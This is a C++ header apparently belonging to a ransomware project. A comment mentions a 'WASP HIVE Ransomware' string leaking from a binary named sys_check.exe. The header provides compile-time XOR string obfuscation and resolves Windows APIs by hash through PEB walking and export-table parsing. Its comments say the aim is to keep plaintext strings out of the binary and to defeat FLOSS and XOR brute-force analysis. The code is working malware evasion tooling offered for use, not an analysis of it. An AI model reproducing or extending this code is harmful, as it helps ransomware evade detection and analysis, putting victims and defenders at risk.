// ============================================================================
// obfuscation.h — Compile-time String Obfuscation & API Hashing Utilities
// ============================================================================
// Usage:
//   OBF("hello world")  → returns const char* with decrypted string
//   COMPILE_HASH("CreateFileA") → compile-time djb2 hash
//   resolveApiByHash(hModule, COMPILE_HASH("CreateFileA")) → FARPROC
//   getModuleByHash(COMPILE_HASH("kernel32")) → HMODULE
//
// No plaintext strings in the binary after compilation.
// All WinAPI functions are resolved by hash at runtime.
// ============================================================================
#pragma once

#include <cstring>

#ifdef _WIN32
#include <windows.h>
#include <winternl.h>

#include <cstddef>

// Custom LDR entry struct for MinGW cross-compilation compatibility
// MinGW's winternl.h may not define BaseDllName field
#pragma pack(push, 8)
typedef struct _MY_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;
#pragma pack(pop)

#ifndef CONTAINING_RECORD
#define CONTAINING_RECORD(address, type, field) ((type*)((ULONG_PTR)(address) - (ULONG_PTR)(&((type*)0)->field)))
#endif

#endif // _WIN32

// ============================================================================
// CONFIGURATION
// ============================================================================
// Multi-byte rotating XOR key for string obfuscation.
// Change this per build to produce completely different patterns.
// Using 8 bytes with rotation defeats simple XOR bruteforce and FLOSS.
#define STR_OBF_KEY { 0x8D, 0x3A, 0xF6, 0x4B, 0x91, 0x2E, 0xC7, 0x58 }

// ============================================================================
// STRING OBFUSCATION - Compile-time XOR, lazy runtime decryption
// ============================================================================
// The OBF() macro stores XOR'd bytes in the binary and decrypts them once
// into a static buffer on first access. Subsequent calls return the cached
// decrypted pointer. Zero heap allocation.
// ============================================================================

// Storage: holds XOR'd bytes at static/global scope with multi-key rotation.
// FIX: the constructor is now CONSTEXPR — the XOR runs at COMPILE TIME, so the
// plaintext literal is never emitted into the binary. Previously the ctor was
// non-constexpr, so GCC emitted the plaintext as a runtime constructor argument
// (`strings sys_check.exe` leaked "WASP HIVE Ransomware..." etc). With constexpr
// + `static constexpr` in the OBF macro, only the XOR'd bytes land in .rdata.
template <size_t N>
struct ObfuscatedString {
    char data[N];

    constexpr ObfuscatedString(const char (&str)[N]) : data{} {
        const unsigned char _key[] = STR_OBF_KEY;
        for (size_t i = 0; i < N; i++) {
            data[i] = static_cast<char>(str[i] ^ _key[i % sizeof(_key)]);
        }
    }
};

// Macro: wraps a string literal, decrypts once with rotating multi-byte key,
// returns const char*. Uses lambda IIFE (C++11 compatible, works at file scope).
// The rotating key defeats FLOSS and simple XOR bruteforce tools.
// The stored bytes are XOR'd at compile time (constexpr) — plaintext absent.
#define OBF(str)                                                  \
    ([]() -> const char* {                                        \
        static constexpr ObfuscatedString<sizeof(str)> _os(str);  \
        static char _buf[sizeof(str)];                            \
        static bool _init = false;                                \
        if (!_init) {                                             \
            const unsigned char _key[] = STR_OBF_KEY;             \
            for (size_t _i = 0; _i < sizeof(str); _i++) {        \
                _buf[_i] = _os.data[_i] ^ _key[_i % sizeof(_key)];\
            }                                                     \
            _init = true;                                         \
        }                                                         \
        return (const char*)_buf;                                 \
    })()

// ============================================================================
// API HASHING - Resolve APIs by hash instead of plaintext name
// ============================================================================
// djb2 hash: compile-time with constexpr, runtime with inline function.
// Use COMPILE_HASH("FunctionName") for hash constants, then resolve via
// resolveApiByHash() which walks the PE export table (no strings at all).
// ============================================================================

// Compile-time djb2 hash (C++11 compatible constexpr recursion)
constexpr unsigned long djb2_hash(const char* str, unsigned long hash = 5381) {
    return *str ? djb2_hash(str + 1, ((hash << 5) + hash) + (unsigned char)(*str)) : hash;
}

// Macro: compute djb2 hash of a string literal at compile time
#define COMPILE_HASH(str) djb2_hash(str)

// Runtime djb2 hash (for dynamic strings)
inline unsigned long hashString(const char* str) {
    unsigned long hash = 5381;
    int c;
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }
    return hash;
}

// ============================================================================
// PE EXPORT TABLE WALKER - Resolves API function by hash
// Completely avoids GetProcAddress and any string literals in resolution.
// Walks the module's export directory, hashes each exported name, and
// returns the first function whose hash matches target_hash.
// ============================================================================
#ifdef _WIN32
inline FARPROC resolveApiByHash(HMODULE hModule, unsigned long target_hash) {
    if (!hModule) return nullptr;

    // DOS header
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hModule;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

    // NT headers
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    // Export directory
    IMAGE_EXPORT_DIRECTORY* exports = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    if (!exports->NumberOfNames) return nullptr;

    DWORD* names      = (DWORD*)((BYTE*)hModule + exports->AddressOfNames);
    WORD*  ordinals   = (WORD*)((BYTE*)hModule + exports->AddressOfNameOrdinals);
    DWORD* functions  = (DWORD*)((BYTE*)hModule + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        if (!names[i]) continue;

        char* name = (char*)((BYTE*)hModule + names[i]);

        // Hash this exported name
        unsigned long hash = 5381;
        int c;
        while ((c = *name++)) {
            hash = ((hash << 5) + hash) + c;
        }

        if (hash == target_hash) {
            return (FARPROC)((BYTE*)hModule + functions[ordinals[i]]);
        }
    }

    return nullptr;
}

// ============================================================================
// RESOLVE MODULE - Get module handle by hash instead of name
// Walks the PEB's InMemoryOrderModuleList to find a loaded module
// whose base name (case-insensitive) matches target_hash.
// ============================================================================
inline HMODULE getModuleByHash(unsigned long target_hash) {
    // Walk the PEB to find loaded modules
    #ifdef _WIN64
        PEB* peb = (PEB*)__readgsqword(0x60);
    #else
        PEB* peb = (PEB*)__readfsdword(0x30);
    #endif

    if (!peb || !peb->Ldr) return nullptr;

    LIST_ENTRY* head = &peb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY* entry = head->Flink;

    while (entry != head) {
        MY_LDR_DATA_TABLE_ENTRY* ldr = (MY_LDR_DATA_TABLE_ENTRY*)
            CONTAINING_RECORD(entry, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        if (ldr->DllBase) {
            // Hash the base DLL name (without extension)
            UNICODE_STRING* us = &ldr->BaseDllName;
            if (us->Buffer && us->Length > 0) {
                // Convert wide char to lowercase ASCII hash
                unsigned long hash = 5381;
                for (SIZE_T i = 0; i < us->Length / sizeof(wchar_t); i++) {
                    wchar_t wc = us->Buffer[i];
                    if (wc == L'.') break; // stop at extension
                    char c = (wc >= L'A' && wc <= L'Z') ? (char)(wc + 32) : (char)wc;
                    hash = ((hash << 5) + hash) + (unsigned char)c;
                }
                if (hash == target_hash) {
                    return (HMODULE)ldr->DllBase;
                }
            }
        }

        entry = entry->Flink;
    }

    return nullptr;
}

#endif // _WIN32
